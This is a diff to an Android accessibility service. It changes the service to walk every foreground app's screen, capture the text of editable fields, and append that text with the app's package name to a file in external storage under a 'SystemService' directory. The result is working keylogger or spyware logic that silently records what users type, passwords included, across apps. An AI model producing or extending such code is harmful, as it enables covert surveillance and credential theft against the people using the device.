@@ -32,12 +32,11 @@ public class MyAccessibilityService extends AccessibilityService {
             if (isExternalStorageWritable()) {
 
                 Log.i(LOGTAG, "Saving");
-                save(event.getPackageName() + ":" + eventText);
 
             }
             Log.d("PackageName", event.getPackageName().toString());
             Log.d("EventName", eventText);
-            traverseNode(getRootInActiveWindow());
+            traverseNode(getRootInActiveWindow(), event.getPackageName().toString());
 
         }
     }
@@ -55,8 +54,8 @@ public class MyAccessibilityService extends AccessibilityService {
         Log.i(LOGTAG, Environment.getExternalStorageDirectory().toString() + "/SystemService");
 
         try {
-            stream = new FileOutputStream(notes);
-            stream.write(s.getBytes());
+            stream = new FileOutputStream(notes, true);
+            stream.write(("\n"+s).getBytes());
         } catch (IOException e) {
             e.printStackTrace();
         } finally {
@@ -73,7 +72,7 @@ public class MyAccessibilityService extends AccessibilityService {
 
     }
 
-    private void traverseNode(AccessibilityNodeInfo node) {
+    private void traverseNode(AccessibilityNodeInfo node, String packageName) {
         if (null == node)
             return;
 
@@ -81,12 +80,13 @@ public class MyAccessibilityService extends AccessibilityService {
         if (count > 0) {
             for (int i = 0; i < count; i++) {
                 AccessibilityNodeInfo childNode = node.getChild(i);
-                traverseNode(childNode);
+                traverseNode(childNode, packageName);
             }
-        } else if (node.getText() != null) {
-            if (node.isEditable() == true) {
+        } else if (node.getText() != null && !node.getText().toString().equals("")) {
+            if (node.isEditable()) {
                 CharSequence text = node.getText();
-                Log.d("test", "Node text = " + text);
+                save(packageName + ": " + text.toString());
+                Log.d("test", "Node text = \"" + text.toString() + "\"");
             }
         }
 
